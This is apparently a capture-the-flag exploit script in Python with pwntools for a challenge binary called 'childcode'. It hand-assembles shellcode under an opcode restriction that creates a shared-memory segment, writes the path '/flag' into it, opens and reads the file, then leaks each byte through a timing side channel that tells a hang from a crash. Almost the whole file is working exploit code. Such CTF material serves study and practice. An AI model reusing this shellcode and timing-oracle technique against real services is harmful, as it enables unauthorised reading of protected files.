from pwn import *
import sys
import signal

# threshold for timing attack
char_idx = int(sys.argv[1])
test = int(sys.argv[2])

def handler(signum, frame):
    global io
    print("Forever is over!")
    io.close()

signal.signal(signal.SIGALRM, handler)

# context.log_level = 'DEBUG'
context.binary = elf = ELF('childcode')
context.terminal = "cmd.exe /c start wsl".split()
io = process('childcode')
# io = remote('pwn-d71ab54264.challenge.xctf.org.cn', 9999, ssl=True)

# below for
"""
shmget(0, 0x5555, 511)
rax = 29
rdi = 0
rsi = 0x5555
rdx = 511

returns: rax - shmid, i.e. the identifier of the System V shared memory segment
"""

code = [
    b"\xb9\x55\x55\x00\x00", # mov ecx, 21845
    b"\x91", # xchg ecx, eax
    b"\x96", # xchg esi, eax
    bytes.fromhex('69 fa 00 00 00 00'), # imul   edi, edx, 0
    bytes.fromhex('69 d7 00 00 00 00'), # imul   edx, edi, 0
    b"\xb9\x00\xff\x00\x00", # mov ecx, 0xff00
    b"\x91", # xchg ecx, eax
    b'\x87\xc3',#                   xchg   ebx, eax
    b'\x32\xd7',#                   xor    dl, bh
    b"\xb9\x05\x00\x00\x00", # mov ecx, 5
    b"\x91", # xchg ecx, eax
    b"\xff\xc8", # dec eax
    b"\xff\xc8", # dec eax
    b"\xff\xc8", # dec eax
    b"\xff\xc8", # dec eax
    b'\x32\xf0',#                   xor    dh, al
    b"\xb9\x1e\x00\x00\x00", # mov ecx, 30
    b"\x91", # xchg ecx, eax
    b"\xff\xc8", # dec eax
    b"\x0f\x05", # syscall
]


# below code2 and code3 for
"""
shmat(shmid, shmaddr, shmflg)
rax: 30
rdi: prev_rax
rsi: shmaddr 0x23b4a000
rdx: 511 (0o777) in reality it only creates RW segment instead of RWX segment by the kernel for security reason

returns: RAX: memory address of the RW segment (0x23b4a000)
"""

# put rdi = rax
code2 = [
    
    b'\x87\xc3',#                   xchg   ebx, eax
    b'\xff\xc3', #                   inc    ebx
    b"\xb9\x00\xff\xff\xff", # mov ecx, -256
    b"\x91", # xchg ecx, eax
    b'\x87\xc3',#                   xchg   ebx, eax     # now ebx = -256, eax is the counter+1

    # placeholder
    b'\x91'*(1282-516),    # xchg ecx, eax
    # so like a do while loop
    b'\xff\xc3'*256, #                   inc    ebx   # this line repeating 256 times
    b"\xff\xc8", # dec eax
    b'\x3c\x00', #                   cmp    al, 0x0
    b"\x0f\x87\xfa\xfa\xff\xff", # ja -1280?
    bytes.fromhex('69 d7 00 00 00 00'), # imul   edx, edi, 0
    b'\x32\xd7',#                   xor    dl, bh
    b'\x0F\x41\xFA',    #  cmovno edi, edx


]

# call shmat (code2 and code3)
code3 = [

    # rdx as 511
    bytes.fromhex('69 d7 00 00 00 00'), # imul   edx, edi, 0
    b"\xb9\x00\xff\x00\x00", # mov ecx, 0xff00
    b"\x91", # xchg ecx, eax
    # b"\x93", # xchg   ebx, eax
    b'\x87\xc3',#                   xchg   ebx, eax
    # b"\x30\xfa", # xor    dl, bh
    b'\x32\xd7',#                   xor    dl, bh
    b"\xb9\x05\x00\x00\x00", # mov ecx, 5
    b"\x91", # xchg ecx, eax
    b"\xff\xc8", # dec eax
    b"\xff\xc8", # dec eax
    b"\xff\xc8", # dec eax
    b"\xff\xc8", # dec eax
    # b"\x30\xc6", # xor    dh, al
    b'\x32\xf0',#                   xor    dh, al


    # rsi    4-byte address
    b"\xb9\x00\xa0\xb4\x23", # mov ecx, 0x23b4a000       130 * 160 * 160 * 180 = 0x23b4a000
    b"\x91", # xchg ecx, eax
    b"\x96", # xchg esi, eax

    # rax = 30
    b"\xb9\x1e\x00\x00\x00", # mov ecx, 30
    b"\x91", # xchg ecx, eax


    b"\x0f\x05", # syscall
]


# below code4 and payload for putting /flag to the RW memory segment above

code4 = [

    # set rdi as 0x23b4a000
    bytes.fromhex('69 d7 00 00 00 00'), # imul   edx, edi, 0

    b"\xb9\x00\x82\x00\x00", # mov ecx, 130
    b"\x91", # xchg ecx, eax
    b'\x87\xc3',#                   xchg   ebx, eax
    b'\x32\xd7',#                   xor    dl, bh      now rdx = 130

    bytes.fromhex('69 fa a0 00 00 00'), # imul   edi, edx, 160    130*160
    bytes.fromhex('69 d7 a0 00 00 00'), # imul   edx, edi, 160    130*160*160
    bytes.fromhex('69 fa b4 00 00 00'), # imul   edi, edx, 180

]

payload = b''
for target in b'/flag':
    b5 = (((target-1) // 5) + 1) * 5
    payload += b"\xb9" + bytes([b5]) + b"\x00\x00\x00" # mov ecx, b5
    payload += b"\x91" # xchg ecx, eax
    payload += b'\xff\xc8' * ((5-target) % 5)   # dec eax
    payload += b'\xaa'  # stosb byte ptr [rdi], al        # !!!!!! auto add 1 to rdi address, GOOD!!!!!!!


"""
int openat(int dirfd, const char *path, int flags, ...
                  /* mode_t mode */ );
rax = 257
edi = 0  (ignored since we provide absolute path)
rsi = addr   (pointer for absolute path '/flag')
rdx = 0  O_RDONLY

Returns: 3 as the first available fd at rax
"""
openat = [


    # rsi = 0x23b4a000
    b"\xb9\x00\xa0\xb4\x23",   # mov ecx, 0x23b4a000       130 *160 *160 *180 = 0x23b4a000
    b"\x91", # xchg ecx, eax
    b"\x96", # xchg esi, eax

    # rdi = 0 for absolute path
    bytes.fromhex('69 fa 00 00 00 00'), # imul   edi, edx, 0

    # rdx = 0 O_RDONLY
    bytes.fromhex('69 d7 00 00 00 00'), # imul   edx, edi, 0

    # rax = 257
    b"\xb9\xff\x00\x00\x00", # mov ecx, 255
    b"\x91", # xchg ecx, eax
    b'\x05\x05\x00\x00\x00', # add eax, 5
    b"\xff\xc8", # dec eax
    b"\xff\xc8", # dec eax
    b"\xff\xc8", # dec eax
    
    b"\x0f\x05", # syscall
]

"""
ssize_t pread(int fd, void buf[count], size_t count,
             off_t offset);
rax = 17
rdi = 3  (fd)
rsi = addr - reuse 0x23b4a000
rdx = length (255)
r10 = 0 (offset)
"""
pread64 = [
    # rsi    4-byte address
    b"\xb9\x00\xa0\xb4\x23", # mov ecx, 0x23b4a000       130 * 160 * 160 * 180 = 0x23b4a000
    b"\x91", # xchg ecx, eax
    b"\x96", # xchg esi, eax

    
    bytes.fromhex('69 d7 00 00 00 00'), # imul   edx, edi, 0
    # r10 is offset, 0
    b'\x4b\x87\xd2',    #                rex.WXB xchg r10, rdx

    # rdi = 3
    bytes.fromhex('69 fa 00 00 00 00'), # imul   edi, edx, 0
    bytes.fromhex('69 d7 00 00 00 00'), # imul   edx, edi, 0
    b"\xb9\x00\x05\x00\x00", # mov ecx, 0x0500
    b"\x91", # xchg ecx, eax
    b"\xff\xc8"*(0x500-0x300), # dec eax   from 0x500 -> 0x300
    b'\x87\xc3',#                   xchg   ebx, eax
    b'\x32\xd7',#                   xor    dl, bh
    b'\x0F\x41\xFA',    #  cmovno edi, edx

    # rdx = 0xff
    bytes.fromhex('69 d7 00 00 00 00'), # imul   edx, edi, 0
    b"\xb9\x00\xff\x00\x00", # mov ecx, 0xff00
    b"\x91", # xchg ecx, eax
    b'\x87\xc3',#                   xchg   ebx, eax
    b'\x32\xd7',#                   xor    dl, bh

    # rax = 17
    b"\xb9\x14\x00\x00\x00", # mov ecx, 20
    b"\x91", # xchg ecx, eax
    b"\xff\xc8", # dec eax
    b"\xff\xc8", # dec eax
    b"\xff\xc8", # dec eax
    b"\x0f\x05", # syscall
]


# 60, 61, 62, 63, 64 -> 60
# since our cmp can only compare at multiple of 5. if we want to test for 62, we in fact decrease the flag byte by 2 (from 62 to 60) and then send `cmp al, 60`
to_send = (test // 5) * 5
dec_times = test - to_send

for pad_times in range(5):
    llength = (2 + dec_times * 2 + pad_times * 3)
    if llength % 5 == 0:
        break

# setting char index of the flag
# 1, 2, 3, 4, 5 -> first to 5, then dec back
inc_rax5 = (((char_idx-1) // 5) + 1)
dec_rax_times = inc_rax5 * 5 - char_idx

#correct char = the smallest one that finish quick

time_attack = [
    # set base address at RBX
    b"\xb9\x00\xa0\xb4\x23", # mov ecx, 0x23b4a000       130 *160 *160 *180 = 0x23b4a000
    b"\x91", # xchg ecx, eax
    b'\x87\xc3',#                   xchg   ebx, eax

    # get required byte at position idx of the flag
    b"\xb9\x00\x00\x00\x00", # mov ecx, 0
    b"\x91", # xchg ecx, eax
    b'\x05\x05\x00\x00\x00'*inc_rax5, # add eax, 5
    b"\xff\xc8"*dec_rax_times, # dec eax
    b'\xd7',    # xlatb   # AL = [RBX + AL]
    b"\xff\xc8"*dec_times, # dec eax

    # labal:
    b'\x0F\x41\xFA',    #  cmovno edi, edx   # dummy - occupy space for ja -10 to work
    b'\x3c'+bytes([to_send]), #                   cmp    al, byte_val
    b"\x0f\x87\xf5\xff\xff\xff", # ja -10, goto label;    #infinite loop if the byte of flag is larger than the given test value
    # otherwise the program segfault immediately

]

raw = b"".join(code+code2+code3+code4) + payload + b''.join(openat+pread64+time_attack)

print(len(raw))

io.sendlineafter(b'codelen: ', str(len(raw)).encode())
# gdb.attach(io, gdbscript='break *0x55555555545f')
# pause()
io.sendlineafter(b'code: ', raw)

try:
    # if program gets into the infinite loop for 1 seconds, terminate it. and this mean the byte of flag is larger than the given test value
    signal.alarm(1)   # increase if needed
    print(io.recvall())
    signal.alarm(0)
    io.close()
except:
    io.close()
    pass